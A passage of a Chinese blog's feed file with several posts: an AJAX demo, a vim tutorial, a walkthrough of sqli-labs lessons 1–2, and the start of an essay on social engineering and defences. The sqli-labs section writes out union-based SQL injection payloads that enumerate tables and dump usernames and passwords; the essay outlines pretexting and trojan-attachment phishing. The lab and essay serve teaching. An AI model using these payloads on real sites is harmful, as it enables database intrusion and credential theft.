&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> aBtns = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;button&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                    当我们下载完数据以后需要对数据的处理方式不一样</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                    【注】$ajax，我们需要按照传参的顺序，依次传入我们的参数。</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">                */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                aBtns[<span class="number">0</span>].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    $ajax(&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">url</span>: <span class="string">&quot;code14/1.get.php&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">username</span>: <span class="string">&quot;小明&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">age</span>: <span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">password</span>: <span class="string">&quot;123abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">result</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;GET请求到的数据：&quot;</span> + result);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;GET请求数据错误：&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                aBtns[<span class="number">1</span>].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    $ajax(&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">url</span>: <span class="string">&quot;code14/2.post.php&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">username</span>: <span class="string">&quot;小花&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">age</span>: <span class="number">18</span>,</span></span><br><span class="line"><span class="language-javascript">                            <span class="attr">password</span>: <span class="string">&quot;123abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">result</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;POST请求到的数据：&quot;</span> + result);</span></span><br><span class="line"><span class="language-javascript">                        &#125;,</span></span><br><span class="line"><span class="language-javascript">                        <span class="attr">error</span>: <span class="keyword">function</span>(<span class="params">msg</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                            <span class="title function_">alert</span>(<span class="string">&quot;POST请求数据错误：&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">                        &#125;</span></span><br><span class="line"><span class="language-javascript">                    &#125;)</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>GET请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>POST请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结:以上就是前后端交互工具AJAX的重点内容</p><p>原文链接：<a href="https://blog.csdn.net/Oriental_/article/details/104863762">https://blog.csdn.net/Oriental_/article/details/104863762</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim入门</title>
      <link href="/post/4571b888.html"/>
      <url>/post/4571b888.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-使用hjkl来移动你的光标"><a href="#1-使用hjkl来移动你的光标" class="headerlink" title="1.使用hjkl来移动你的光标"></a>1.使用hjkl来移动你的光标</h1><pre><code>h:向左移动j:向下移动K:向上移动l:向右移动</code></pre><h1 id="2-插入模式和退出vim的方法"><a href="#2-插入模式和退出vim的方法" class="headerlink" title="2.插入模式和退出vim的方法"></a>2.插入模式和退出vim的方法</h1><h2 id="2-1插入模式"><a href="#2-1插入模式" class="headerlink" title="2.1插入模式"></a>2.1插入模式</h2><p>  敲击i键，发现左下角有个–INSERT–，进入插入模式</p><p>  敲击Esc，退出插入模式</p><h2 id="2-2退出vim"><a href="#2-2退出vim" class="headerlink" title="2.2退出vim"></a>2.2退出vim</h2><p>  不保存修改，强制退出，输入 :q!</p><p>  保存修改，再退出，按下：shift+Z+Z;或者 :wq</p><h1 id="3-删除命令、数字的奥义、撤销和恢复命令"><a href="#3-删除命令、数字的奥义、撤销和恢复命令" class="headerlink" title="3.删除命令、数字的奥义、撤销和恢复命令"></a>3.删除命令、数字的奥义、撤销和恢复命令</h1><h2 id="3-1删除命令"><a href="#3-1删除命令" class="headerlink" title="3.1删除命令"></a>3.1删除命令</h2><p>  在普通模式（非插入模式下），小写x可删除光标所在位置的字符</p><pre><code>motion:0/^：光标去到行首$：光标去到行尾gg：光标去到段首G：光标去到段尾</code></pre><h2 id="3-2数字的奥义"><a href="#3-2数字的奥义" class="headerlink" title="3.2数字的奥义"></a>3.2数字的奥义</h2><pre><code>·数字+motion = 重复多个motion·d + 数字 + motion = 删除多个motion范围</code></pre><h2 id="3-3撤销和恢复"><a href="#3-3撤销和恢复" class="headerlink" title="3.3撤销和恢复"></a>3.3撤销和恢复</h2><pre><code>·u 表示撤销最后一次修改·U 表示撤销对整行的修改·Ctrl + r快捷键可以修复撤销的内容</code></pre><h1 id="4-粘贴拷贝、替换命令、替换模式和修改命令"><a href="#4-粘贴拷贝、替换命令、替换模式和修改命令" class="headerlink" title="4.粘贴拷贝、替换命令、替换模式和修改命令"></a>4.粘贴拷贝、替换命令、替换模式和修改命令</h1><h2 id="4-1粘贴-amp-拷贝"><a href="#4-1粘贴-amp-拷贝" class="headerlink" title="4.1粘贴&amp;拷贝"></a>4.1粘贴&amp;拷贝</h2><h3 id="4-1-1粘贴"><a href="#4-1-1粘贴" class="headerlink" title="4.1.1粘贴"></a>4.1.1粘贴</h3><pre><code>使用p命令可以将最后一次删除的内容粘贴到光标之后·注意: 如果你粘贴的内容以整行为单位，那么p命令将在光标的下一行开始粘贴；      如果你粘贴的内容是非整行的局部字符串，那么p命令将在光标后开始粘贴</code></pre><h3 id="4-1-2拷贝"><a href="#4-1-2拷贝" class="headerlink" title="4.1.2拷贝"></a>4.1.2拷贝</h3><pre><code>使用y命令可以实现拷贝：y[数字] motione.g. y+$:从光标当前的位置拷贝到行尾</code></pre><h2 id="4-2替换命令"><a href="#4-2替换命令" class="headerlink" title="4.2替换命令"></a>4.2替换命令</h2><ul><li>r命令用于替换光标所在的字符，做法是先将光标移动到需要替换的字符处，按一下r键，然后输入新的字符</li><li>按R整体进入替换模式</li></ul><p>##4.3修改模式<br>【修改和替换模式是不一样的】</p><pre><code>使用c命令可以实现修改：c[数字] motion</code></pre><p>修改 &#x3D;&#x3D; 删除 + 进入插入模式</p><h1 id="5-文件信息、跳转和定位括号"><a href="#5-文件信息、跳转和定位括号" class="headerlink" title="5.文件信息、跳转和定位括号"></a>5.文件信息、跳转和定位括号</h1><h2 id="5-1跳转"><a href="#5-1跳转" class="headerlink" title="5.1跳转"></a>5.1跳转</h2><p>  行号+G  &#x2F; :+行号</p><h2 id="5-2定位括号"><a href="#5-2定位括号" class="headerlink" title="5.2定位括号"></a>5.2定位括号</h2><p>  按下%键，能迅速找到括号的另一半</p><h1 id="6-搜索命令和替换命令"><a href="#6-搜索命令和替换命令" class="headerlink" title="6.搜索命令和替换命令"></a>6.搜索命令和替换命令</h1><h2 id="6-1搜索命令"><a href="#6-1搜索命令" class="headerlink" title="6.1搜索命令"></a>6.1搜索命令</h2><p>vim的搜索是从按下&#x2F;开始的<br><img src="/img/%E6%90%9C%E7%B4%A2%E5%91%BD%E4%BB%A4.jpg" alt="搜索命令"></p><p>:nohl 可以解除全部的高亮</p><p>搜索带有特殊意义的字符如“.”，得再加一个反斜杠，如“&#x2F;.“</p><h2 id="6-2替换命令"><a href="#6-2替换命令" class="headerlink" title="6.2替换命令"></a>6.2替换命令</h2><p><img src="/img/%E6%9B%BF%E6%8D%A2%E5%91%BD%E4%BB%A4.jpg" alt="替换命令"></p><h1 id="7-执行shell命令、文件另存为和合并文件"><a href="#7-执行shell命令、文件另存为和合并文件" class="headerlink" title="7.执行shell命令、文件另存为和合并文件"></a>7.执行shell命令、文件另存为和合并文件</h1><p>ls展开整体目录；vi打开相关文件</p><h2 id="7-1shell命令"><a href="#7-1shell命令" class="headerlink" title="7.1shell命令"></a>7.1shell命令</h2><p>查看所有目录 :!</p><h2 id="7-2文件另存为"><a href="#7-2文件另存为" class="headerlink" title="7.2文件另存为"></a>7.2文件另存为</h2><p>文件另存为 :w + 文件名</p><p>局部内容另存为</p><pre><code>第一步：按v，进入可视模式第二步：选择部分，再w + 文件名</code></pre><h2 id="7-3合并文件"><a href="#7-3合并文件" class="headerlink" title="7.3合并文件"></a>7.3合并文件</h2><p>:r + 文件名</p><h2 id="7-4打开多个文件"><a href="#7-4打开多个文件" class="headerlink" title="7.4打开多个文件"></a>7.4打开多个文件</h2><p>vi +</p><pre><code>-o水平并排-O垂直并排</code></pre><p><img src="/img/%E6%89%93%E5%BC%80%E5%A4%9A%E4%B8%AA%E6%96%87%E4%BB%B6.jpg" alt="打开多个文件"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vim编辑器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs大冒险</title>
      <link href="/post/beaf4f1e.html"/>
      <url>/post/beaf4f1e.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-介绍"><a href="#0-介绍" class="headerlink" title="0.介绍"></a>0.介绍</h1><p>很多时候新手在学习sql注入的时候，往往找不到合适的靶场进行练习操作。而sqli-labs就是一个适合新手去练习注入的一个专业的SQL注入练习平台，<br>是一个印度程序员写的程序，用来学习sql注入的一个游戏教程。其中包含了各种各样的注入姿势，并适用于GET和POST等场景，包含了以下注入：</p><ol><li>基于错误的注入（Union Select）<br>字符串<br>整数</li><li>报错注入</li><li>盲注（基于Bool数据类型注入、基于时间注入）</li><li>mysql 读写文件</li><li>更新查询注入（update ）</li><li>插入查询注入（insert ）</li><li>Header头部注入（基于Referer注入、基于UserAgent注入、基于cookie注入）</li><li>二次注入</li><li>绕过WAF<br>绕过黑名单\过滤器\剥离\注释剥离 OR＆AND 剥离空格和注释剥离 UNION和SELECT</li><li>绕过addslashes()函数</li><li>绕过mysql_real_escape_string()函数（在特殊条件下）</li><li>堆叠注入（堆查询注入）<br>等…</li></ol><h1 id="lesson-0"><a href="#lesson-0" class="headerlink" title="lesson 0"></a>lesson 0</h1><blockquote><p>准备工作:</p></blockquote><ul><li><p><a href="https://blog.csdn.net/qq_36618918/article/details/107772254">环境搭建教程</a></p></li><li><p><a href="https://blog.csdn.net/qq_32169923/article/details/51120465">Help1</a></p></li></ul><blockquote><p>mysql数据结构</p></blockquote><p>在练习靶场前我们需要了解以下mysql数据库结构，mysql数据库5.0以上版本有一个自带的数据库叫做information_schema,<br>该数据库下面有两个表一个是tables和columns。tables这个表的table_name字段下面是所有数据库存在的表名。<br>table_schema字段下是所有表名对应的数据库名。columns这个表的colum_name字段下是所有数据库存在的字段名。<br>columns_schema字段下是所有表名对应的数据库。了解这些对于我们之后去查询数据有很大帮助。我们前面机关讲解比较详细后面就比较简单了。</p><h1 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h1><h1 id="1-1判断是否存在sql注入"><a href="#1-1判断是否存在sql注入" class="headerlink" title="1.1判断是否存在sql注入"></a>1.1判断是否存在sql注入</h1><p>1.提示你输入数字值的ID作为参数，我们输入?id&#x3D;1<br><img src="https://img-blog.csdnimg.cn/a2d4edae2a224efd9b1ef485bcef305a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图1"></p><p>2.通过数字值不同返回的内容也不同，所以我们输入的内容是带入到数据库里面查询了。<br><img src="https://img-blog.csdnimg.cn/3ec56a55dfbb4416a1ee931d35369e3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图2"></p><p><img src="https://img-blog.csdnimg.cn/471cc882a2bf4e61b3e900ce9cc8d474.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图3"></p><p>3.接下来我们判断sql语句是否是拼接，且是字符型还是数字型。</p><p><img src="https://img-blog.csdnimg.cn/faadf05c87824470b850abce5ce5feae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图4"></p><p><img src="https://img-blog.csdnimg.cn/bfb3344c362946d581bab1db77061cce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图5"></p><p>4.可以根据结果指定是字符型且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询原理简单说一下，联合查询就是两个sql语句一起查询，两张表具有相同的列数，且字段名是一样的。</p><h1 id="1-2联合注入"><a href="#1-2联合注入" class="headerlink" title="1.2联合注入"></a>1.2联合注入</h1><p>第一步：首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;order by 3 --+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/03cdb359637e40b28141cfba1ecc2a5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图6"></p><p><img src="https://img-blog.csdnimg.cn/e12ae90285c94fa2b1bdf6e615a9df25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图7"></p><p>第二步：爆出显示位，就是看看表格里面那一列是在页面显示的。可以看到是第二列和第三列里面的数据是显示在页面的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p>第三步：获取当前数据名和版本号，这个就涉及mysql数据库的一些函数，记得就行。通过结果知道当前数据看是security,版本是5.7.26。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,database(),version()--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ca4e32e196546059a05b5460de908b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图8"></p><p>第四步： 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。也就是下面表格user和passwd。<br><img src="https://img-blog.csdnimg.cn/d448426b2cc84e88ba229bf9d4e69665.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="图9"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p>第五步：爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。</p><p>该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5ed25df2b23e463c8e8f6404cf316742.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图10"></p><p>第六步：通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。我自己加了一个id可以隔一下账户和密码。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4eb042ffd4fc4aab95cb064773f74734.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图11"></p><h1 id="lesson2"><a href="#lesson2" class="headerlink" title="lesson2"></a>lesson2</h1><p>和第一关是一样进行判断，当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所有我们可以猜测sql语句应该是数字型注入。那步骤和我们第一关是差不多的，<br><img src="https://img-blog.csdnimg.cn/6af0163f75764d5c829eb69265646b38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图12"></p><p><img src="https://img-blog.csdnimg.cn/6648d0ad721040fd9e69cd420ee1c9e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA57OK5raC5piv56aPeXl5eQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="图13"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;</span><br><span class="line">&quot;SELECT * FROM users WHERE id=1 &#x27; LIMIT 0,1&quot;出错信息。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),version()</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username ,id , password) <span class="keyword">from</span> users</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL Injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析社会工程手段与防范措施</title>
      <link href="/post/880e50f2.html"/>
      <url>/post/880e50f2.html</url>
      
        <content type="html"><![CDATA[<pre><code>                                    written by Enboy_Yu</code></pre><p>摘要：随着信息时代的发展，社会工程攻击手段之势有如雨后春笋。而传统式网络安全无论在技术维度，还是在相关管理的维度，大抵是集中在不断更迭换代的硬件物质因素和外在行为因素，忽略了本应处于网络安全核心地位的人为心理因素，致使社会工程学攻击已经成为了未来十年内信息安全中的最大隐患。把握社会工程学的心理规律特点,有效地进行信息安全防御,有助于降低个人和社会损失。</p><p>关键词：信息安全，社会工程学，模型，信息搜集</p><h1 id="1工程手段"><a href="#1工程手段" class="headerlink" title="1工程手段"></a>1工程手段</h1><h2 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h2><p>所谓社会工程学，其概念是最早在2002年由凯文·米特尼克在《欺骗的艺术》中提出的。但目前学界对社会工程学并没有一个规范的成文化定义，而根据相关社会工程学案例，可将其总结为：社会工程学是将自然行为、社会制度等作为入口，利用人的心理弱点以及规章制度上的漏洞，布下全套，意图获得其目标信息，最终通过未经授权的路径访问某些重要数据。</p><pre><code>[凯文·米特尼克]：美国著名黑客。在他的《欺骗的艺术》中的描述，可以将社会工程学黑客技术总结为：社会工程学就是通过自然的、社会的和制度上的途径，利用人的心理弱点(如人的本能反应、好奇心、信任、贪婪)以及规则制度上的漏洞，在攻击者和被攻击者之间建立起信任关系，获得有价值的信息，最终可以通过未经授权的路径访问某些重要数据。社会工程学攻击与其他类型攻击的最大区别是：会与受害者进行交互式行为，建立一个陷阱让对方掉入或是伪造身份来建立信任关系都属于典型的社会工程学的手段。</code></pre><p>事实上，随着信息安全技术的发展，人为因素才是信息安全的真正软肋。攻击者利用技术弱点进行信息安全攻击已经渐趋黔驴技穷，是故越来越多的黑客开始转向利用人性弱点，运用社会工程手段渗透。这使他们无需耗费较大代价，便可达其目的。</p><p>当前的大环境也正是社会工程手段的温床：许多信息科技企业在安全技术上投入不菲的资金，可最终导致机密泄露的原因，却往往是人为因素。对于黑客们而言，通过几个用户名、几串数字、几组英文代码，借用社会学攻击手段，加以筛选、整理，就能把你的所有个人情况的基本信息、你在网上留下的一切痕迹等掌握得一清二楚。虽然这些可能是最不起眼，听起来不像“黑客”那么高级的方法。但事实如此，这种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正风兴云蒸。</p><h2 id="1-2攻击特点"><a href="#1-2攻击特点" class="headerlink" title="1.2攻击特点"></a>1.2攻击特点</h2><p>概括性地讲，社会工程学是利用人的心理弱点与制度的漏洞来攻击。基本的意思就是借助一切可能的途径、手段，搜集攻击目标对象的信息，然后利用已知资料攻陷对方。与传统的网络攻击相比，社会工程学攻击具有以下一些特点：</p><p>(1)两面性。在某种程度上，社会工程学主导着新式的信息安全。它是一把双刃剑，既可以帮助安全机关完成预防及侦察工作，也可能被不法分子利用来进行破坏行为。所以其性质取决于我们的重视与使用。</p><p>(2)针对性。社会工程学攻击的核心是利用人为因素的手段来进行攻击。其观点认为，人的行为才是整个信息安全体系中最脆弱的部分。攻击者会针对其目标对象性格中的信任、恐惧、威胁、懒惰、健忘等特点，通过伪造身份、设置陷阱等手段，最终获取自己想要的信息。</p><p>(3)有效性。首先，攻击者不必再把时间和精力浪费在寻找漏洞、破解口令等环节上，而是直接瞄准信息的拥有者，减少了中间环节的同时，还更容易隐藏真实身份。另外，许多信息公司盲目地追求利益的最大化，罔视在雇员信息安全培训上的投资，使得在更多情况下，人比系统更加脆弱。</p><p>我们举一个简明的案例来说明社会工程的手段：假设黑客Adam想要渗透一个网站，但在千辛万苦的检索后并没有发现该网站的漏洞。因此黑客Adam伪造了一封带有特洛伊木马式的陷阱附件的电子邮件，并通过该网站的通讯地址发送该电子邮件欺骗网站管理员Bob，称其已成功入侵该网站，电子邮件附件就是入侵后的图像。如果管理员Bob相信Adam的话或出于谨慎考虑打开附件，Adam将潜入网站的后门，并为后续的入侵工作找到突破。由此观之，我们可以将社会工程攻击提炼为四个步骤：巧妙收集信息、伪装身份获取信息、组织信息设置陷阱和获取攻击权限。<br>社会工程似乎是一个简单的骗局，但却包含着纷繁的心理因素。我们可以防止技术入侵，但谁能时刻警惕心理漏洞呢？毫无疑问，社会工程将是未来对抗安全渗透的一个重要领域。</p><h2 id="1-3攻击类型"><a href="#1-3攻击类型" class="headerlink" title="1.3攻击类型"></a>1.3攻击类型</h2><h3 id="1-3-1基于人类（Human-Based）"><a href="#1-3-1基于人类（Human-Based）" class="headerlink" title="1.3.1基于人类（Human Based）"></a>1.3.1基于人类（Human Based）</h3><p>这是一种围绕人的行为的社会工程学手段。在此类中，我们需要人与人的互动来接触到目标信息。这里列举几种常见的方法：</p><p>(1)伪装<br>这是社工攻击中最为广泛的手段之一。黑客首先通过各种手段成为你经常接触到的熟人，然后逐渐被你企业的其他同事认可，他们时常造访你的企业，并最终赢得信赖，可以在企业中获得许多权限来实施计划，比如访问那些本不应允许的区域或者下班后还能进入办公室等。</p><p>(2)投桃报李<br>通过利益交换的方式达成双方各自利益的行为，成为投桃报李。这类攻击需要长期业务合作达成的非正式关系。利用公司之间的信任关系，可以轻松的获取特定信息的目标人员。</p><p>(3)冒充<br>重要人物冒充 — 假装是部门的高级主管，要求工作人员提供所需信息。<br>求助职员冒充 — 假装是需要帮助的职员，请求工作人员帮助解决问题，借以获得信息。<br>技术支持冒充 — 假装是正在处理网络问题的技术支持人员，要求获得所需信息以解决问题。</p><p>(4)寻求帮助<br>这是经典的社工方法之一。向帮助台和服务人员提出问题、寻求帮助，并最终套取想要的信息，这让他们成为了社会工程学攻击热门目标。</p><h3 id="1-3-2基于网络（Internet-Based）"><a href="#1-3-2基于网络（Internet-Based）" class="headerlink" title="1.3.2基于网络（Internet Based）"></a>1.3.2基于网络（Internet 